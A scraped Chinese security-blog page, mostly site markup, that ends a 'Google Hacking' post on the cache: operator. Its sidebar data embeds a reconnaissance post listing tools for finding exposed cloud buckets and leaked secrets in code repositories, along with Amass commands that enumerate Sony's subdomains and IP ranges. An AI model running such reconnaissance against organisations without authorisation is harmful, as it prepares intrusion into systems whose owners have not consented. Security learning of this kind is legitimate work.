<p>网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:<a href="http://www.hackingspirits.com">www.hackingspirits.com</a> guest ，将返回指定网站的缓存，并且正文中含有guest</p> </div>  <astro-island uid="Z1v8zuY" prefix="r16" component-url="/_astro/EmbedHydrator.BYQxiqHV.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;EmbedHydrator&quot;,&quot;value&quot;:true}"></astro-island> <astro-island uid="27sCYi" prefix="r17" component-url="/_astro/CustomContentEnhancer.BXo4OX_Z.js" component-export="CustomContentEnhancer" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;config&quot;:[0,{&quot;addBlankTarget&quot;:[0,true],&quot;smoothScroll&quot;:[0,true],&quot;addHeadingLevel&quot;:[0,true],&quot;enhanceCodeBlock&quot;:[0,true],&quot;enableCodeCopy&quot;:[0,true],&quot;enableCodeFullscreen&quot;:[0,true],&quot;enableLinkEmbed&quot;:[0,true],&quot;enableTweetEmbed&quot;:[0,true],&quot;enableOGPreview&quot;:[0,true],&quot;previewCacheTime&quot;:[0,3600],&quot;lazyLoadEmbeds&quot;:[0,true]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;CustomContentEnhancer&quot;,&quot;value&quot;:true}"></astro-island> </article> <astro-island uid="wBKw9" prefix="r4" component-url="/_astro/GiscusComments.BNQOQ1R1.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;GiscusComments&quot;,&quot;value&quot;:true}" await-children><div class="w-full pb-12"></div><!--astro:end--></astro-island> </div>  <div class="tablet:grid-cols-1 grid grid-cols-2 gap-4 px-10 md:px-6"><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold">推荐文章</h2><div class="flex flex-col gap-2"><a href="/blog/post/14" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">1</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Penetration</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Google Hacking</div></div></a><a href="/blog/post/1" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">2</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Others</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Windows同时安装多个JDK</div></div></a><a href="/blog/post/17" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">3</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Others</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Astro博客搭建</div></div></a><a href="/blog/post/3" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">4</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Redis未授权访问</div></div></a><a href="/blog/post/9" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">5</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Mr-Robot</div></div></a></div></div><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold"></h2><div class="flex flex-col gap-2 -mt-4 pt-12 md:-mt-5 md:pt-0"><a href="/blog/post/20" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">6</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">CVE-2020-15778-OpenSSH命令注入漏洞复现</div></div></a><a href="/blog/post/4" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">7</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Metasploitable-1</div></div></a><a href="/blog/post/2" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">8</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Penetration</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">人肉搜索</div></div></a><a href="/blog/post/10" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">9</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Kioptrix level 1</div></div></a><a href="/blog/post/13" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">10</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Kioptrix level 3</div></div></a></div></div></div><footer class="mt-auto pb-6 md:pb-4"><div class="mx-auto flex flex-col items-center gap-3 px-6 md:px-3 max-w-7xl"><div class="text-muted-foreground flex flex-wrap items-center justify-center gap-6 text-sm md:gap-4"><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点总字数"><i class="fa-regular fa-file-lines text-sm" aria-hidden="true"></i><span class="font-medium">26k</span><span class="text-xs">字</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点阅读时长"><i class="fa-regular fa-clock text-sm" aria-hidden="true"></i><span class="font-medium">2:23</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="文章总数"><i class="fa-regular fa-newspaper text-sm" aria-hidden="true"></i><span class="font-medium">20</span><span class="text-xs">篇</span></button></div><div class="text-muted-foreground flex items-center gap-0.5 text-sm"><span class="opacity-75">Â©</span><span class="font-medium opacity-75">2022</span><span class="opacity-50">-</span><span class="font-medium opacity-75" itemProp="copyrightYear">2026</span><svg class="mx-1 size-5 animate-spin text-[#FFC0CB] duration-10000" viewBox="0 0 512 512" fill="currentColor"><g><path fill="currentColor" d="M330.555,101.873c0-34.164-13.767-65.108-36.047-87.622c-2.432-2.465-9.63-4.349-14.212,3.466
		c-4.589,7.808-17.205,27.431-17.205,27.431c-1.534,2.438-4.219,3.918-7.089,3.918c-2.883,0-5.555-1.48-7.089-3.918
		c0,0-12.623-19.623-17.205-27.431c-4.582-7.815-11.781-5.931-14.219-3.466c-22.274,22.514-36.04,53.458-36.04,87.622
		c0,51.02,30.663,94.847,74.553,114.142C299.892,196.72,330.555,152.892,330.555,101.873z"></path><path fill="currentColor" d="M204.51,253.425c-4.78-47.705-36.998-90.409-85.518-106.176c-32.492-10.554-66.177-7.027-94.47,7.205
		c-3.096,1.555-7.117,7.822-1.096,14.589c6.007,6.774,20.766,24.842,20.766,24.842c1.849,2.212,2.432,5.22,1.542,7.952
		c-0.891,2.74-3.13,4.829-5.918,5.528c0,0-22.562,5.945-31.404,7.89c-8.849,1.945-9.281,9.37-7.692,12.445
		c14.527,28.144,39.698,50.801,72.197,61.362C121.436,304.828,172.6,289.212,204.51,253.425z"></path><path fill="currentColor" d="M96.772,362.484c-20.082,27.643-27.136,60.766-22.342,92.074c0.527,3.424,5.233,9.178,13.527,5.554
		c8.308-3.63,30.054-12.088,30.054-12.088c2.672-1.062,5.698-0.692,8.041,1c2.329,1.692,3.623,4.466,3.418,7.335
		c0,0-1.308,23.294-2.199,32.315c-0.883,9.006,6.048,11.712,9.466,11.15c31.252-5.116,60.581-22.054,80.662-49.704
		c29.993-41.266,30.944-94.758,6.781-136.155C177.332,303.773,126.758,321.204,96.772,362.484z"></path><path fill="currentColor" d="M287.824,313.964c-24.165,41.397-23.212,94.888,6.78,136.155c20.082,27.65,49.41,44.588,80.663,49.704
		c3.418,0.562,10.349-2.144,9.466-11.15c-0.89-9.021-2.205-32.315-2.205-32.315c-0.198-2.869,1.102-5.643,3.431-7.335
		c2.322-1.692,5.363-2.062,8.034-1c0,0,21.746,8.458,30.047,12.088c8.294,3.623,13.007-2.13,13.534-5.554
		c4.787-31.308-2.254-64.43-22.342-92.074C385.246,321.204,334.672,303.766,287.824,313.964z"></path><path fill="currentColor" d="M503.6,215.254c-8.849-1.945-31.41-7.89-31.41-7.89c-2.795-0.706-5.027-2.788-5.918-5.528
		c-0.89-2.732-0.308-5.74,1.534-7.952c0,0,14.76-18.068,20.78-24.842c6.014-6.766,1.993-13.034-1.096-14.589
		c-28.301-14.232-61.978-17.76-94.485-7.205c-48.519,15.767-80.731,58.472-85.512,106.176
		c31.91,35.787,83.067,51.403,131.593,35.636c32.492-10.561,57.67-33.218,72.191-61.362
		C512.867,224.624,512.449,217.199,503.6,215.254z"></path></g></svg><span class="author font-medium opacity-75" itemProp="copyrightHolder">Kaguya<!-- -->@Kaguya</span></div><div class="text-muted-foreground/80 flex items-center gap-2 text-xs"><span class="opacity-75">Powered by theme</span><a href="https://github.com/XueHua-s/astro-snow" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">snow-koharu</a><span class="opacity-50">In·</span><span class="opacity-75">From by</span><a href="https://github.com/amehime/hexo-theme-shoka" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">astro-koharu</a></div></div></footer> </div> </div> </div>  </main> <div id="floating-nav" class="text-primary fixed right-4 bottom-4 z-50 flex flex-col gap-2" data-expanded="true" data-astro-cid-uwaxo4qb> <div id="nav-content" class="flex scale-y-100 flex-col gap-2 opacity-100" data-astro-cid-uwaxo4qb> <button id="scroll-to-top" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="回到顶部" title="回到顶部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-up text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> <button id="scroll-to-bottom" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="滚到底部" title="滚到底部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-down text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <button id="toggle-nav" class="flex-center bg-background/80 hover:bg-background size-9 rounded-full shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="展开/收起工具栏" title="展开/收起工具栏" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-wand-magic-sparkles menu-nav-icon hidden text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> <i class="fa-solid fa-xmark close-nav-icon text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <script type="module" src="/_astro/FloatingGroup.astro_astro_type_script_index_0_lang.CfPC7qUw.js"></script>  <astro-island uid="1UtwvC" prefix="r19" component-url="/_astro/MobileDrawerPanel.D2RaSu2k.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;MobileDrawerPanel&quot;,&quot;value&quot;:true}" await-children><div id="drawer-overlay" class="fixed inset-0 z-[60] bg-black/50 hidden" role="presentation" aria-hidden="true"></div><div id="mobile-drawer" class="bg-gradient-start tablet:flex fixed inset-y-0 left-0 z-[70] hidden h-screen w-[70vw] min-w-64 transform px-4 pt-6 shadow-lg backdrop-blur-sm transition-transform duration-300 md:px-0 -translate-x-full" role="dialog" aria-label="导航菜单" aria-modal="true"><div class="flex h-full w-full flex-col overflow-auto"><div class="flex justify-end pb-2 pr-4"><div class="flex" id="close-drawer"><button class="flex-center text-shoka size-10 cursor-pointer rounded-full bg-white/20 select-none hidden" aria-label="关闭菜单" aria-expanded="false" type="button"><i class="text-xl fa-solid fa-xmark" aria-hidden="true" style="opacity:1;transform:rotate(90deg)"></i></button></div></div><astro-slot> <div class="page-home-sider shadow-home-sider sticky top-0 self-start max-w-64 flex-col overflow-hidden h-screen min-h-0 items-center tablet:flex mt-4 hidden w-full min-w-full p-0"> <astro-island uid="ZuvRNr" prefix="r15" component-url="/_astro/HomeSiderPanel.D_zmuAB0.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/724d7fb480c8ac0db472ca5c7e36d239.jpg&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,20],&quot;categoryCount&quot;:[0,4],&quot;tagCount&quot;:[0,20],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;首页&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-house-chimney&quot;]}],[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;],&quot;children&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}]]]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-regular fa-circle-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/14/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;site&quot;],&quot;text&quot;:[0,&quot;site:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;filetype&quot;],&quot;text&quot;:[0,&quot;filetype:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;inurl&quot;],&quot;text&quot;:[0,&quot;inurl:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intitle&quot;],&quot;text&quot;:[0,&quot;intitle:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intext&quot;],&quot;text&quot;:[0,&quot;intext：&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cache&quot;],&quot;text&quot;:[0,&quot;cache&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/一些情报源&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 云信息\n```\nAliyun、AWS、GCP、Azure等\n查找可公开访问的实例\nhttps://github.com/gwen001/s3-buckets-finder\nhttps://github.com/nccgroup/aws-inventory\nhttps://github.com/jordanpotti/AWSBucketDump\n```\n# APP反编译\n```\nurl、js、osskey、api等信息查找\n搜集到接口Fuzz常见参数\n```\n# C段/B段信息\n```\nBanner、是否存在目标的后台或其他入口/其他业务系统\n```\n# 工具\n```\nrecon-ng,theharvester,maltego,exiftool等\nhttps://www.spiderfoot.net/\nhttps://github.com/smicallef/spiderfoot\n```\n# 网页缓存\n```\nhttp://www.cachedpages.com/\nhttps://archive.org/web\n```\n# 图片反查\n```\n百度识图、googleimage、tineye\n原图查询坐标\n```\n# Github/Gitee等代码托管平台\n```\nhttps://github.com/dxa4481/truffleHog\nhttps://github.com/lijiejie/GitHack\nhttps://github.com/MiSecurity/x-patrol\nhttps://github.com/az0ne/Github_Nuggests\nhttps://github.com/0xbug/Hawkeye\nhttps://github.com/mazen160/GithubCloner 克隆用户的github\nhttps://github.com/michenriksen/gitrob.git\n```\n# 被入侵网址列表\n```\nhttp://zone-h.org/archive\nwooyun镜像查找目标企业曾出现的漏洞\nhttp://wooyun.2xss.cc/\n```\n# Amass 深入的击面映射和资产发现\n```\nhttps://github.com/OWASP/Amass \n  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp; CIDR IP Range of a Company\n  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp; IP Address from ASN\n  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN \n  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang\n  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp; whois\n  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp; asn\n```\n# 威胁情报平台\n```\nVirustotal：https://www.virustotal.com/gui/home/upload\n腾讯哈勃分析系统：https://habo.qq.com/tool/index\n微步在线威胁情报：https://x.threatbook.cn/\n奇安信威胁情报：https://ti.qianxin.com/\n360威胁情报：https://ti.360.net/#/homepage\n安恒威胁情报：https://ti.dbappsecurity.com.cn/\n火线安全平台：https://www.huoxian.cn\nHacking8安全信息流：https://i.hacking8.com/\n零零信安：https://0.zone\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/一些情报源.md&quot;],&quot;digest&quot;:[0,&quot;ed23490867e26891&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;云信息\&quot;&gt;云信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#云信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Aliyun、AWS、GCP、Azure等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查找可公开访问的实例&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/gwen001/s3-buckets-finder&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/nccgroup/aws-inventory&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/jordanpotti/AWSBucketDump&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;app反编译\&quot;&gt;APP反编译&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#app反编译\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;url、js、osskey、api等信息查找&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;搜集到接口Fuzz常见参数&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;c段b段信息\&quot;&gt;C段/B段信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#c段b段信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Banner、是否存在目标的后台或其他入口/其他业务系统&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;工具\&quot;&gt;工具&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#工具\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;recon-ng,theharvester,maltego,exiftool等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.spiderfoot.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/smicallef/spiderfoot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网页缓存\&quot;&gt;网页缓存&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网页缓存\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://www.cachedpages.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://archive.org/web&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;图片反查\&quot;&gt;图片反查&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#图片反查\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;百度识图、googleimage、tineye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;原图查询坐标&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;githubgitee等代码托管平台\&quot;&gt;Github/Gitee等代码托管平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#githubgitee等代码托管平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/dxa4481/truffleHog&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/lijiejie/GitHack&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/MiSecurity/x-patrol&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/az0ne/Github_Nuggests&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/0xbug/Hawkeye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/mazen160/GithubCloner 克隆用户的github&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/michenriksen/gitrob.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;被入侵网址列表\&quot;&gt;被入侵网址列表&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#被入侵网址列表\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://zone-h.org/archive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wooyun镜像查找目标企业曾出现的漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://wooyun.2xss.cc/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;amass-深入的击面映射和资产发现\&quot;&gt;Amass 深入的击面映射和资产发现&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#amass-深入的击面映射和资产发现\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/OWASP/Amass &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp;#x26; CIDR IP Range of a Company&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp;#x26; IP Address from ASN&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp;#x26; whois&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp;#x26; asn&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;威胁情报平台\&quot;&gt;威胁情报平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#威胁情报平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light 